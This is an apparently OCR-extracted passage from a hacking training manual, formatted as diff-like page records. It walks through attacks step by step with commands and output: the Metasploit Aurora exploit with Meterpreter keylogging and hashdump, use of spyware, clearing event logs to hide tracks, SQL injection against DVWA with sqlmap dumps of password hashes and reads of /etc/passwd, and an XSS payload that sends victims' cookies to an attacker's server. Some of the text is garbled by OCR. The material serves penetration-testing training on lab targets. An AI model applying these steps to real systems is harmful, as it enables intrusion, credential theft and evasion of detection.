+    > exploit(ms10_002_aurora) > set URIPATH /
+
+    > exploit
+
+    sessions -l
+
+    sessions -i 1
+
+
+    help
+
+    getpid
+
+    ps
+
+    migrate 1680\keyscan_start
+
+    keyscan_dump
+
+    ```
+
+
+    +   * Write
+
+
+    # msfconsole
+
+    MsF-search windows/ms10_
+
+    Use exploit /windows/browser/ms10_002_aurora
+
+    >Set SRVHOST 192.168.28.133 (your ip)
+
+    >Set SRVPORT 80 (the port the program will listen)
+
+    >Set URIPATH /
+
+    >Exploit
+
+    >Sessions -l (To access all sessions)
+
+    >Session -i 1
+
+    Some commands in interpreter session
+
+    nHashdump (To get the files on the accessed computer)
+
+    Getpid (To know the level you)
+
+    Migrate 948 (To increase your privilege)
+
+    Keyscan_start to make key logger on the client
+
+    Keyscan_dump (To get the information)
+
+
+    ```
+
+    msf exploit(ms10_002_aurora) > set SRVHOST 192.168.28.133
+
+    msf exploit(ms10_002_aurora) > set SRVPORT 80
+
+    SRVPORT: 80
+
+    msf exploit(ms10_002_aurora) > set URIPATH /
+
+    URIPATH: /
+
+    msf exploit(ms10_002_aurora) > exploit
+
+    [*] Started reverse handler running on background job: 192.168.28.133:4444
+
+    [*] Using URL: http://192.168.28.133:80/ [* Server started.
+
+    ```'
+  merge: -1
+  pgno: 64
+- img_proc: true
+  md: '```
+
+    root@bt: ~
+
+    File Edit View Terminal Help
+
+    C:\WINDOWS\system32\wuauclt.exe
+
+
+    meterpreter > getpid
+
+    Current pid: 2412
+
+    meterpreter > migrate 948
+
+    [*1] Migrating from 2412 to 948...
+
+    [*1] Migration completed successfully.
+
+    meterpreter > popd
+
+    nCurrent pid: 948
+
+    meterpreter > keycan start
+
+    Starting the keystroke sniffer...
+
+    meterpreter > keycan dump
+
+    Dumping captured keystrokes...
+
+
+    meterpreter > migrate 2412
+
+    [*1] Migrating from 2412 to 2412...
+
+    [*1] Migration completed successfully.
+
+    meterpreter > keycan start
+
+    Starting the keystroke sniffer...
+
+    meterpreter > keycan dump
+
+    Dumping captured keystrokes...
+
+    hi this is test
+
+    meterpreter >
+
+    ```'
+  merge: -1
+  pgno: 65
+- img_proc: true
+  md: '# p) Spyware Tools
+
+
+    There are a lot of spyware tools
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_66_0.png)
+
+
+    +   - Using Spector
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_66_1.png)
+
+
+    +   - eBlaster'
+  merge: -1
+  pgno: 66
+- img_proc: true
+  md: '# User Activity Summary: user
+
+
+    | Report Details | Activity | Status | Computer Identification |
+
+    |---|---|---|---|
+
+    | Chat / Instant Messages | 0 | ON | IP Address: 192.168.28.138 |
+
+    | Online Searches | 0 | ON | Public IP Address: 203.0.113.252 |
+
+    | Web Sites Visited | 0 | ON | Computer Name: XP-1 Username: user |
+
+    | Email Activity | 0 | ON | |
+
+    | Files Transferred | 0 | ON | Serial Number: 2820OW0062626228 |
+
+
+    +   * You can use spyware
+
+
+    Welcome to Spyware!
+
+    nYou are connected to at at 8/23/2013 10:22:22
+
+
+    Spyware is a powerful remote monitoring and administration tool. Spyware allows
+    you to manage, monitor, and control the remote PC via your web browser. Choose
+    from the list of yours to use Spyware. Listed below are your privileges for the
+    remote PC you are connected to:
+
+
+    Access Rights
+
+    You have the following access rights on the remote PC:
+
+
+    +   * Key Logging Allowed
+
+    * Guest Remote Desktop Allowed
+
+    * Open Window Allowed
+
+    * View Files Allowed
+
+    * View Browser Allowed
+
+    * Running Application Allowed
+
+    * View Registry Allowed
+
+    * View Temporary Histories
+
+    * Shutdown Computer Allowed
+
+    * Delete Log Allowed'
+  merge: -1
+  pgno: 67
+- img_proc: true
+  md: 'o) Understanding Rootkits
+
+    They are some programs or tools that enables to keep the root privileges and hide
+    all process you make. Kits mean the group of tools that allow you to control the
+    computer. There is application rootkit and kernel rootkit. The application rootkit
+    can control some applications and commands like is and dir. They can hide the
+    processes in the background and control the ports and hide them. The kernel rootkits
+    are the most dangerous rootkits and we need to change the operating system if
+    it was infected with kernel rootkits. It infects the kernel of the machine.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_68_0.png)'
+  merge: -1
+  pgno: 68
+- img_proc: true
+  md: '# r) Understanding how to hide files
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_69_0.png)
+
+
+    We can hide the file through the attrib command that can change the properties
+    of the file.
+
+
+    +   - Create file 1.txt in the c: and use the command attrib +h to change its
+    attribute and hide it.
+
+
+    ```
+
+    C:\cd d
+
+    C:\dattrib +h 1.txt
+
+    ```
+
+
+    +   - We can hide files in the ntfs drive through the ntfs stream property.
+
+
+    Use the following command to create a file test.txt. Use the same command to open
+    it.
+
+
+    ```
+
+    C:\Documents and Settings\user>cd
+
+    C:\cd d
+
+    C:\dattrib +h 1.txt
+
+    C:\dnotepad test.txt
+
+    C:\dnotepad test.txt:hide.txt
+
+    ```
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_69_1.png)
+
+
+    +   - The asterisk put in the beginning of the file name. To show hidden files
+    press ctrl+h, or go to menu, press show hidden file.'
+  merge: -1
+  pgno: 69
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 70
+- img_proc: true
+  md: '# s) Understanding Steganography Technologies
+
+
+    Steganography is the process of hiding data in other types of data such as images
+    or text files. The most popular method of hiding data in files is to utilize graphic
+    images as hiding places. Attackers can embed any information in a graphic file
+    using steganography. The hacker can hide directions on making a bomb, a secret
+    bank account number, or answers to a test. Really any text imaginable can be hidden
+    in an image.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_71_0.png)'
+  merge: -1
+  pgno: 71
+- img_proc: true
+  md: "# t) Understanding Covering Tracks and Erasing Evidences:\n\nUnderstanding\
+    \ How to Cover Tracks and Erasing Evidence\n\nOnce intruders have successfully\
+    \ gained Administrator access on a system, they try to cover their tracks to prevent\
+    \ detection of their presence (either current or past) on the system. A hacker\
+    \ may also try to remove evidence of their identity or activities on the system\
+    \ to prevent tracking of their identity or location by authorities. The hacker\
+    \ usually erases any error messages or security events that have been logged,\
+    \ preventing detection. In the following sections, we will look at disabling auditing\
+    \ and clearing the event log, which are two methods used by a hacker to cover\
+    \ their tracks and avoid detection.\n\nClearing the event log (wevtutil cl Application)\
+    \ masking /remove /allusers history server or VPN Connection\n\n+   - Go to event\
+    \ viewer\n\n![](img/91b4da451291288ee84ff207e23ccb97_72_0.png)\n\n| Information\
+    \ | Date and Time | Source | Event ID | Task C | Actions |\n|---|---|---|---|---|---|\n\
+    | Information | 7/23/2013 10:18:56 AM | Distribu... | 10029 | None | Saved |\n\
+    | Information | 7/23/2013 10:18:56 AM | Information | 7509 | None | Create Custo...\
+    \ |\n| Service | 7/23/2013 10:18:56 AM | Service... | 7056 | Import Custo... |\n\
+    | Service | 7/23/2013 04:04:15 PM | Service... | 7056 | Event 7036 |\n\n+   -\
+    \ Weavutil.exe is used to control the logs in the machine. We can clear all logs\
+    \ by this tool Use the script in the CD which will clear all logs. Run the file,\
+    \ it will clear all logs.\n\n![](img/91b4da451291288ee84ff207e23ccb97_72_1.png)\n\
+    \n+   - We can disable auditing.\n\n```\nAdministrator: C:\\Windows\\system32\\\
+    cmd.exe\nMicrosoft Windows [Version 6.0.6081]\nCopyright (C) 2009, Microsoft Corporation.\
+    \ All rights reserved.\nC:\\Users>remove /allusers\nThe command was successfully\
+    \ executed.\nC:\\Users>\n```\n\n+   - We can work through the proxy server or\
+    \ the vpn connection to hide the real ip.\n We can also work through vps server."
+  merge: -1
+  pgno: 72
+- img_proc: true
+  md: '# 5. Part D: Hacking Web Servers
+
+
+    # a) Understanding Database
+
+
+    An organized collection of data. The data are typically organized to model relevant
+    aspects of reality in a way that supports processes requiring this information.
+    For example, modeling the availability of rooms in hotels in a way that supports
+    finding a hotel with vacancies.
+
+
+    +   - Database Query
+
+    - SELECT * FROM user WHERE username = ''admin'' AND password = ''admin''
+
+    - Database Column
+
+    - SELECT
+
+    - Insert
+
+    - Update
+
+    - Delete
+
+    - UNION ALL
+
+    - ORDER BY
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_73_0.png)'
+  merge: -1
+  pgno: 73
+- img_proc: true
+  md: '# b) Database Injection:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_74_0.png)
+
+
+    The data base injection is to inject the database with certain data to alter the
+    database and execute certain commands on the system that has this database.'
+  merge: -1
+  pgno: 74
+- img_proc: true
+  md: '# c) Discovering SQL injection:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_75_0.png)
+
+
+    If we put '' and we het error code, then the website has mysql injection.'
+  merge: -1
+  pgno: 75
+- img_proc: true
+  md: '# d) MySQL Injection Threats
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_76_0.png)'
+  merge: -1
+  pgno: 76
+- img_proc: true
+  md: '# c) MySQL authentication Bypass
+
+
+    +   - SQL Injection authentication Bypass
+
+    - use some Comments
+
+    - or 1=1 --
+
+    - or ''1''=''1'' --
+
+    - or ''1''=''1'' ((
+
+    - or ''1''=''1''
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_77_0.png)
+
+
+    ```
+
+    SELECT * FROM user WHERE username = ''admin'' AND password = admin
+
+    SELECT * FROM user WHERE username = ''*'' or ''1''=''1'' AND password =
+
+    ```'
+  merge: -1
+  pgno: 77
+- img_proc: true
+  md: '# f) Automated SQL injection using some tools:
+
+
+    Havij is an automated SQL Injection tool. It''s famous enough that I''m sure you
+    know it or you''ve heard its name. As you may have already noticed about new version,
+    it was just released today. It has new practical features such as "Dump all".
+    It is similar to "dump-all" in Sqlmap. As far I concern mixture of Havij and Sqlmap
+    can lead you to having successful attack on vulnerable target. By the permission
+    of vendor which I''ve already been granted, I shall show you an example of a simple
+    attack where the installed application on it was prone to a MySQL injection vulnerability
+
+
+    +   - Download netspacker to scan web site
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_78_0.png)
+
+
+    +   - Take the vulnerable url'
+  merge: -1
+  pgno: 78
+- img_proc: true
+  md: "# Table of Content\n\n+   - SQL Injection\n  - Attack Summary\n- Non Technical\n\
+    \  - Impact\n  - External References\n\nSQL injection occurs when data input by\
+    \ a user is interpreted as a SQL command rather than normal data by the database.\
+    \ This vulnerability is confirmed by executing a SQL Query on the back-end database.\n\
+    \n# Summary\n\nVulnerability: Critical\nConfirmation: Confirmed\n\n```\nVulnerable\
+    \ URL: http://testphp.vuln.com/search.php?id=100' OR 105=105 OR 108=108 OR 101=101\
+    \ OR 109=109)--\n```\n\n![](img/91b4da451291288ee84ff207e23ccb97_79_0.png)\n\n\
+    +   - Open Havij tools\n\n![](img/91b4da451291288ee84ff207e23ccb97_79_1.png)\n\
+    \n+   - Using webbrowser\n\n![](img/91b4da451291288ee84ff207e23ccb97_79_2.png)"
+  merge: -1
+  pgno: 79
+- img_proc: true
+  md: 'First, input any username and password which are wrong, here we input 123 and
+    456:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_80_0.png)
+
+
+    submit it and switch to the "Resend" tab.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_80_1.png)
+
+
+    80'
+  merge: -1
+  pgno: 80
+- img_proc: true
+  md: '# g) Automated SQL injection using sqlmap:
+
+
+    sqlmap is an open source penetration testing tool that automates the process of
+    detecting and exploiting SQL injection flaws and taking over database servers.
+    It has a powerful detection engine, many niche features for the ultimate penetration
+    tester and a broad range of switches lasting from database fingerprinting, over
+    data fetching from the database, to accessing the underlying file system and executing
+    commands on the operating system via out-of-band connections.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_81_0.png)
+
+
+    +   - Take the cookie with the temper data plugin
+
+
+    | 19:03... | 24 ms | 143 ms | 4368 | 200 | text/html | http://... LOAD_DOCUME
+    |
+
+    |---|---|---|---|---|---|---|---|n| 19:03... | 0 ms | | 4368 | unkno... | GET
+    | pending | unknown | http://... LOAD_N... |
+
+    | 19:03... | 0 ms | | 4368 | unkno... | GET | pending | unknown | http://... LOAD_N...
+    |
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_81_1.png)
+
+
+    +   - Take the url of the website
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_81_2.png)
+
+
+    +   - Go application, backtrack, exploitation tools, sqlmap
+
+
+    Write the command'
+  merge: -1
+  pgno: 81
+- img_proc: true
+  md: '# # python sqlmap.py -u ''url'' --cookie=''cookie'' --dbs
+
+
+    ```
+
+    root:/pentest/database/sqlmap python sqlmap.py -u ''http://192.168.1.4/vulnerability/sql1/?id=165Submit--cookie
+    PHPSESSID=bodqea7g3fge1f8pr4vo5''
+
+    ql: security=low --dbs
+
+    ```
+
+
+    +   - We will get all the databases
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_82_0.png)
+
+
+    ```
+
+    [19:05:01] [INFO] the back-end DBMS is MySQL
+
+    web application technology PHP 5.3.1, Apache 2.2.14
+
+    [19:05:01] [INFO] fetched database name
+
+    available databases:
+
+    * dwva
+
+    * information schema
+
+    * mysql
+
+    * phpmyadmin
+
+    * test
+
+    [19:05:01] [INFO] fetched data logged to text files under ''/pentest/database/output/192.168.1.4/''
+
+    [19:05:01] shutting down at 19:05:01
+
+    ```
+
+
+    +   - Change the command to put the database name and show the users in that database
+
+
+    ```
+
+    root:/pentest/database/sqlmap python sqlmap.py -u ''http://192.168.1.4/vulnerability/sql1/?id=165Submit--cookie
+    PHPSESSID=bodqea7g3fge1f8pr4vo5''
+
+    ql: security=low -D dwva
+
+    ```
+
+
+    +   - Change the command to put the database name table name and show the users
+    in that database
+
+
+    ```
+
+    root:/pentest/database/sqlmap python sqlmap.py -u ''http://192.168.1.4/vulnerability/sql1/?id=165Submit--cookie
+    PHPSESSID=bodqea7g3fge1f8pr4vo5''
+
+    ql: security=low --T users column
+
+    ```
+
+
+    +   - Put the command to show all users information'
+  merge: -1
+  pgno: 82
+- img_proc: true
+  md: "```\nColumn\tType\ndata\tvarchar(255)\nname\tvarchar(32)\npassword\tvarchar(35)\n\
+    user\tvarchar(15)\nuser_id\tint(6)\n\n[19:05:52] (INFO) fetched data logged to\
+    \ text file /pentest/database/os/output/192.168.1.4\nshutting down at 19:05:52\n\
+    :/pentest/database/@map# python sqlmap.py -u \"http://192.168.1.4/vulnerabilities/sql/?id=1&submit=Submit\"\
+    \ --cookie \"PSESSID=bodqea7g3fge1f8pr4vo5j\" --security=low -u avatar --dump\n\
+    ```\n\n+   - It will ask if he has to do dictionary attack, answer yes"
+  merge: -1
+  pgno: 83
+- img_proc: true
+  md: '# h) Automated SQL injection using sqlmap
+
+
+    sqlmap is an open source penetration testing tool that automates the process of
+    detecting and exploiting SQL injection flaws and taking over of database servers.
+    It comes with a powerful detection engine, many nice features for the ultimate
+    penetration tester and a broad range of switches lasting from database fingerprinting,
+    over data fetching from the database, to accessing the underlying file system
+    and executing commands on the operating system via out-of-band connections.
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_84_0.png)
+
+
+    +   - Take the cookie using the temper data plugin
+
+
+    | 19:03: | 24 ms | 141 ms | 4388 | GET | text/html | http://... LOAD_DOCUME |
+
+    |---|---|---|---|---|---|---|n| 19:03: | 0 ms | 0 ms | unkno... | GET | pending
+    | http://... LOAD_ |
+
+    | 19:03: | 0 ms | 0 ms | unkno... | GET | pending | http://... LOAD_|
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_84_1.png)
+
+
+    | Request Header | Request Header Value | Response Header | Response Header Value
+    |
+
+    |---|---|---|---|
+
+    | Host | 192.168.1.4 | Status | OK-200 |
+
+    | User-Agent | Mozilla/5.0 (CT; Linux x86; rv... | Date | Sat, 17 Jun 2003 21:55:02
+    GMT |
+
+    | Accept | text/html,application/xml+tm... | Server | Apache/2.2.14 (Unix) DAV/2
+    mo |
+
+    | Accept-Language | en-US,en=0.5 | Expires | Tue, 23 Jun 2009 12:00:00 GMT |
+
+    | Accept-Encoding | gzip, deflate | Cache-Control | no-cache,must-revalidate |
+
+    | Referer | http://192.168.1.4/vulnerabilities... | Pragma | no-cache |
+
+    | Cookie | PHPSESSID=bdoxa7g3fegpr... | Content-Length | 4388 |
+
+    | Connection | keep-alive | timeout=5,max=100 |
+
+    | | | Content-Type | text/html;charset=utf-8 |
+
+
+    +   - Take the url of the website
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_84_2.png)
+
+
+    +   - Go application, backtrack, exploitation tools, web exploitation tools, sqlmap
+
+
+    Write the command
+
+
+    ```
+
+    # python sqlmap.py -u ''url'' --cookie ''cookie'' --dbs
+
+    ```'
+  merge: -1
+  pgno: 84
+- img_proc: true
+  md: 'http://pentest/database/sqlmap python sqlmap.py -u http://192.168.1.4/vulnerabilities/sql/?id=1&Submit=Submit
+    --cookie PHPSESSID=bodqea7g3f1ge8fpr4voj5;security=low --db
+
+
+    +   * We will get all the databases
+
+
+    ```
+
+    [19:05:01] [INFO] the back DBMS is MySQL
+
+    application technology mysql 5.5.31
+
+    [19:05:01] [INFO] database name apache
+
+    * edcol
+
+    * dwas
+
+    * information schema
+
+    * mysql
+
+    * phpadmin
+
+    * test
+
+    [19:05:01] [INFO] fetched data logged to text files under /pentest/database
+
+    output/192.168.1.4- at 19:05:01
+
+    [+] shutting down at
+
+    ```
+
+
+    +   * Change the command to put the database name and show the tables in database
+
+
+    http://pentest/database/sqlmap python sqlmap.py -u http://192.168.1.4/vulnerabilities/sql/?id=1&Submit=Submit
+    --cookie PHPSESSID=bodqea7g3f1ge8fpr4voj5;security=low -D dwas --tables
+
+
+    +   * Change the command to put the database name and name to show the users in
+    database
+
+
+    ```
+
+    http://pentest/database/sqlmap python sqlmap.py -u http://192.168.1.4/vulnerabilities/sql/?id=1&Submit=Submit
+    --cookie PHPSESSID=bodqea7g3f1ge8fpr4voj5;security=low -T users
+
+    ```
+
+
+    +   * Put the command to show all users information
+
+
+    | Column | Type |
+
+    | --- | --- |
+
+    | username | varchar(64) |
+
+    | password | varchar(32) |
+
+    | user | varchar(15) |
+
+    | user_id | int(6) |
+
+
+    ```
+
+    [19:05:02] [INFO] fetched data logged to text files under /pentest/database/sql/output/192.168.1.4
+
+    [+] shutting down at 19:05:02
+
+    http://pentest/database/sqlmap python sqlmap.py -u http://192.168.1.4/vulnerabilities/sql/?id=1&Submit=Submit
+    --cookie PHPSESSID=bodqea7g3f1ge8fpr4voj5;security=low -u dwas avatar
+
+    ```
+
+
+    +   * It will has to do dictionary attack, answer yes'
+  merge: -1
+  pgno: 85
+- img_proc: true
+  md: <!-- no content -->
+  merge: -1
+  pgno: 86
+- img_proc: true
+  md: '# i) Advanced SQL Commands:
+
+
+    +   - order by 3-
+
+    - union select 1,2-
+
+    - union select 1, version()-
+
+    - union select 1,database()-
+
+    - union select 1,user()-
+
+
+    union select table_schema,null from information_schema.tables-
+
+
+    union select table_name,null from information_schema.tables where table_schema=''dvwa''
+
+
+    union select first_name,password from dvwa.users-
+
+
+    +   * Sometimes we use the SQL injection tool because of the firewall. So you
+    need to depend on yourself manually. You need to know the no of columns in the
+    table and through this way you can run the commands on the server. Use the technique
+    order by.
+
+    * Make the security medium in DVWA
+
+    * Go to SQL injection and query by entering user id
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli?id=1&Submit=Submit
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_87_0.png)
+
+
+    +   * After user id, put the order by (n0), ie 5--then decrease it
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli?id-2--&Submit=
+
+
+    You will get error
+
+
+    +   * It will work order 2-, so there are 2 columns
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli?id=2--&Submit=Submit
+
+
+    +   * We want to know the affected column, so we can run the commands we want
+    to run, so we will use union select. We can download tool called hack back to
+    write the commands
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli?id-1,2--&Submit=Submit'
+  merge: -1
+  pgno: 87
+- img_proc: true
+  md: '# Vulnerability: SQL Injection
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_88_0.png)
+
+
+    +   - To know the database, write
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,database()--&Submit=Submit#
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_88_1.png)
+
+
+    +   - To know the user, write
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select 1,user()--&Submit=Submit#'
+  merge: -1
+  pgno: 88
+- img_proc: true
+  md: '# Vulnerability: SQL Injec
+
+
+    ```
+
+    User ID:
+
+    ID: 2 union select 1,user() --
+
+    First name: Gordon
+
+    Surname: Brown
+
+
+    ID: 2 union select 1,user() --
+
+    First name: 1
+
+    Surname: root@localhost
+
+    ```
+
+
+    +   To know the version http://192.168.52.134/dwa/vulnerabilities/sqli/?id=2 union
+    select 1,version()--&Submit=Submit#
+
+
+    ```
+
+    User ID:
+
+    ID: 2 union select 1,version() --
+
+    First name: Gordon
+
+    Surname: Brown
+
+
+    ID: 2 union select 1,version() --
+
+    First name: 1
+
+    Surname: S.0.51-Ubuntu5
+
+    ```
+
+
+    +   To query the data in the SQL database http://192.168.52.134/dwa/vulnerabilities/sqli/?id=2
+    UNION select distinct(table_schema), null FROM information_schema.tables--&Submit=Submit#
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_89_0.png)'
+  merge: -1
+  pgno: 89
+- img_proc: true
+  md: '# User ID:
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: admin
+
+    Surname: admin
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: information_schema
+
+    Surname:
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: dvwa
+
+    Surname:
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: mysql
+
+    Surname:
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: owasp10
+
+    Surname:
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: tikiwiki
+
+    Surname:
+
+    ```
+
+
+    ```
+
+    ID: 1 UNION select distinct(table_schema), null FROM information_schema.tables--
+
+    First name: tikiwiki95
+
+    Surname:
+
+    ```
+
+
+    +   - To select the table in the database SQL http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2
+    union select table_name, null from information_schema.tables where table_schema=dvwa--&Submit=Submit#n-
+    But you need to encode dvwa
+
+
+    http://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2 union select table_name,
+    null from information_schema.tables where table_schema=0x64677661--&Submit=Submit
+
+
+    # Vulnerability: SQL Injection
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_90_0.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_90_1.png)
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_90_2.png)'
+  merge: -1
+  pgno: 90
+- img_proc: true
+  md: '+   To see the users in the database DVWA at://192.168.52.134/dvwa/vulnerabilities/sqli/?id=2
+    union select first_name,password from dvwa.users --&Submit=Submit
+
+
+    ```
+
+    union select first_name,password from dvwa.users--
+
+    ```
+
+
+    # Vulnerability: SQL Injection
+
+
+    User ID:
+
+
+    ID: 1 select first_name, password from dvwa.users--
+
+    First name: admin
+
+
+    ID: 2 select first_name, password from dvwa.users--
+
+    First name: admin
+
+    Surname: 5f4dc3cb35aa765d61d8327deb882cf99
+
+
+    ID: 3 select first_name, password from dvwa.users--
+
+    First name: Gordon
+
+    Surname: e99a1842c8dec3b5df260853678922e03
+
+
+    ID: 4 select first_name, password from dvwa.users--
+
+    First name: Helen
+
+    Surname: 8d3533d75aec2c396d67e04fcc69216b
+
+
+    ID: 5 select first_name, password from dvwa.users--
+
+    First name: Bob
+
+    Surname: 8da069f75bbe40cade3de5c71e9e97
+
+
+    ID: 6 select first_name, password from dvwa.users--
+
+    First name: Bob
+
+    Surname: 5f4dc3cb35aa765d61d8327deb882cf99'
+  merge: -1
+  pgno: 91
+- img_proc: true
+  md: 'ji Read files by sql injection:
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_92_0.png)
+
+
+    +   - Use the union select null to know the number of tables and number of columns
+    in the table.
+
+    - Go to multitaide, then injections, SQLi extract data, user info. Write
+
+
+    ''union select null --
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_92_1.png)
+
+
+    +   - You will get error message
+
+
+    Dont have an account? Please register here
+
+
+    | Line | 126 |
+
+    | --- | --- |
+
+    | Code | 0 0 0 0 1 1 0 0 0 0 |
+
+    | File | /usr/share/multitaide/user-info.php |
+
+    | Message | Error executing query: The used SELECT statements have a different
+    number of columns |
+
+    | Trace | #0 /usr/share/multitaide/index.php(469): include() #1 (main) |
+
+    | Diagnostic Information | SELECT FROM accounts WHERE username=... AND password=...
+    |
+
+    | | Did you setup/reset the DB? |
+
+
+    +   - Increase the no of nulls until you don''t get error. After 5 nulls I get
+    the answer
+
+
+    ''union select null, null, null, null--'
+  merge: -1
+  pgno: 92
+- img_proc: true
+  md: '# Results for : 1 records found.
+
+
+    +   To load the file, change one of the commands to load_file(''/etc/passwd*)
+
+
+    # Please enter username and password to view account details
+
+
+    | Name | ct null,load_file(''/etc/passwd) |
+
+    | Password | 1 |
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_93_0.png)'
+  merge: -1
+  pgno: 93
+- img_proc: true
+  md: '+   - You can insert in the database the value you want
+
+
+    # Add blog for anonymous
+
+
+    Note: <b></b>, <i></i>, <u></u> and <u></u> are now allowed in blog entries
+
+
+    ```
+
+    TEXT: ''2010-01-01 12:00:00''
+
+    ```'
+  merge: -1
+  pgno: 94
+- img_proc: true
+  md: "# k) Understanding Blind SQL injection:\n\nBlind SQL (Structured Query Language)\
+    \ injection is a type of SQL injection that attacks the database or false questions\
+    \ and determines the answer based on the applications response. This attack is\
+    \ often used when the web application is configured to show generic error messages,\
+    \ but has not mitigated the code that is vulnerable to SQL injection.\n\nWhen\
+    \ an attacker exploits SQL injection, sometimes the web application displays error\
+    \ messages from the database claiming that the SQL Query's syntax is incorrect.\
+    \ Blind SQL injection is nearly identical to normal SQL Injection, the only difference\
+    \ is the way the data is retrieved from the database. When the database does not\
+    \ output data to the web page, an attacker is forced to steal data by asking the\
+    \ database a series of true or false questions. This makes exploiting the SQL\
+    \ injection vulnerability more difficult, but not impossible.\n\n+   * Dependent\
+    \ before in the error message. In blind SQL injection we will depend on sql injection\
+    \ without errors.\n* To get the no of columns, write in the box\n\n1 union select\
+    \ null,null--\n\n| User ID: | |\n|---|---|\n| ID: 1 union select null,null-- |\n\
+    | First name: admin |\n| Surname: admin |\n| ID: 1 union select null,null-- |\n\
+    | First name: |\n| Surname:| \n\n+   * Another technique is to write 1 union select\
+    \ 1,2--\n* To load file,--\n\n1 union select, load_file (/etc/passwd)--\n\n+ \
+    \  * If it does not work, give it the passwd file in hex.\n\n1 union select"
+  merge: -1
+  pgno: 95
+- img_proc: true
+  md: '# Understanding Cross-Site Scripting (XSS)
+
+
+    Cross-Site Scripting attacks are a type of injection problem, in which malicious
+    scripts are injected into the otherwise benign and trusted web sites. Cross-site
+    scripting (XSS) attacks occur when an attacker uses a web application to send
+    malicious code, generally in the form of a browser script, to a different end
+    user. Flows allow these attacks to be quite widespread and occur wherever a web
+    application uses user input in a output without validating or encoding it a malicious
+    script to an unsuspecting user.
+
+
+    An attacker can use XSS to send a script should not be trusted, and will user''s
+    browser has no way to know that the script is false. Because they think the script
+    came from a trusted source, the malicious script can access any cookies, session
+    tokens or other sensitive information retrieved by your browser and used with
+    that. These scripts can rewrite the content of the HTML page.
+
+
+    +   - The reason that there is hole, in the web application program that allows
+    the hacker to execute command or browse the computer. If the hacker wrote a script
+    code and the web application executed the code, then the application has a XSS
+    hole.
+
+
+    +   - There are persistent XSS attacks and reflected XSS attacks
+
+
+    # Persistent XSS Attacks
+
+
+    +   - Stored attacks are where the injected code is permanently stored on the
+    target servers, such as in a database, in a message forum, comment field, etc.
+    the victim retrieves the malicious script from the server when it requests the
+    stored information.
+
+
+    # Reflected XSS Attacks
+
+
+    Reflected attacks are those where the injected code is reflected off the web server,
+    such as in an error message, search result, or any other response that includes
+    some or all of the input sent to the server as part of the request. Reflected
+    attacks are delivered to victims via another route, such as in an email message,
+    or when a user is tricked into clicking on a malicious link or submitting a specially
+    crafted form, the injected code travels to the vulnerable web server, which reflects
+    the attack back to the user''s browser. The browser then executes the code because
+    it came from a "trusted" server.
+
+
+    +   - The reflected XSS attack is through injecting the url, and we call it url
+    inject. In persistent attack, it stores in the database and is very dangerous
+    since anybody will visit the post, the code will be applied on its computer.'
+  merge: -1
+  pgno: 96
+- img_proc: true
+  md: '# m) Reflected XSS Attacks Threat
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_97_0.png)
+
+
+    +   * To know whether the website has the XSS hole, test on multillide. Go to
+    DNS lookup.
+
+    * To know if the web application has the xss hole, write the script
+
+
+    <script>alert(1)</script> You will get 1
+
+
+    To know the session id cookie, we write
+
+
+    <script>alert(document.cookie)</script>
+
+
+    +   * To direct you to other website
+
+
+    <script>document.location="http://www.google.com"</script>
+
+
+    +   * We can use the link directly
+
+
+    ![](img/91b4da451291288ee84ff207e23ccb97_97_1.png)
+
+
+    +   * We can take the cookie of the admin in the website and then we can make
+    login with the cookie and take the admin privilege. We will work on script that
+    will direct to fake hacker server and will help them inject the cookie. In the
+    hacker computer, we will operate one listener that can see the request
+
+    * There is web that can encode the
+
+
+    ```
+
+    <script>document.location="http://192.168.1/index.php?document.cookie";</script>
+
